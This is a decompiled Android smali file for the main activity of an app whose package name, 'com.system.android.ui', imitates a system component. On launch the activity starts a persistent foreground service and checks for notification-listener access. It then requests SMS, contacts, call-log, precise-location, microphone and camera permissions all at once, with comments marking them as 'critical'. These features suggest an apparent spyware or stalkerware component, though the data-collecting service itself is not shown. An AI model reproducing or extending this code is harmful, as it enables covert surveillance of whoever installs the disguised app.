.class public Lcom/system/android/ui/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 17
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method protected onResume()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onResume()V

    return-void
.end method

.method private isNotificationServiceRunning()Z
    .locals 4

    .line 54
    invoke-virtual {p0}, Lcom/system/android/ui/MainActivity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    .line 55
    .local v0, "contentResolver":Landroid/content/ContentResolver;
    nop

    .line 56
    const-string v1, "enabled_notification_listeners"

    invoke-static {v0, v1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 57
    .local v1, "enabledNotificationListeners":Ljava/lang/String;
    invoke-virtual {p0}, Lcom/system/android/ui/MainActivity;->getPackageName()Ljava/lang/String;

    move-result-object v2

    .line 58
    .local v2, "packageName":Ljava/lang/String;
    if-eqz v1, :cond_0

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_0

    const/4 v3, 0x1

    goto :goto_0

    :cond_0
    const/4 v3, 0x0

    :goto_0
    return v3
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 9
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .line 21
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 23
    const/high16 v0, 0x7f040000

    invoke-virtual {p0, v0}, Lcom/system/android/ui/MainActivity;->setContentView(I)V

    .line 24
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/system/android/ui/MainService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcom/system/android/ui/MainActivity;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;


    .line 25
    invoke-direct {p0}, Lcom/system/android/ui/MainActivity;->isNotificationServiceRunning()Z

    move-result v0

    .line 26
    # [PLATINUM] Request Critical Permissions on Launch
    const/4 v1, 0x6
    new-array v1, v1, [Ljava/lang/String;
    const/4 v2, 0x0
    const-string v3, "android.permission.READ_SMS"
    aput-object v3, v1, v2
    const/4 v2, 0x1
    const-string v3, "android.permission.READ_CONTACTS"
    aput-object v3, v1, v2
    const/4 v2, 0x2
    const-string v3, "android.permission.READ_CALL_LOG"
    aput-object v3, v1, v2
    const/4 v2, 0x3
    const-string v3, "android.permission.ACCESS_FINE_LOCATION"
    aput-object v3, v1, v2
    const/4 v2, 0x4
    const-string v3, "android.permission.RECORD_AUDIO"
    aput-object v3, v1, v2
    const/4 v2, 0x5
    const-string v3, "android.permission.CAMERA"
    aput-object v3, v1, v2
    const/16 v2, 0x64
    invoke-virtual {p0, v1, v2}, Lcom/system/android/ui/MainActivity;->requestPermissions([Ljava/lang/String;I)V

    # [PLATINUM] Stay alive to allow permission requests
    return-void

    .line 49
    return-void
.end method
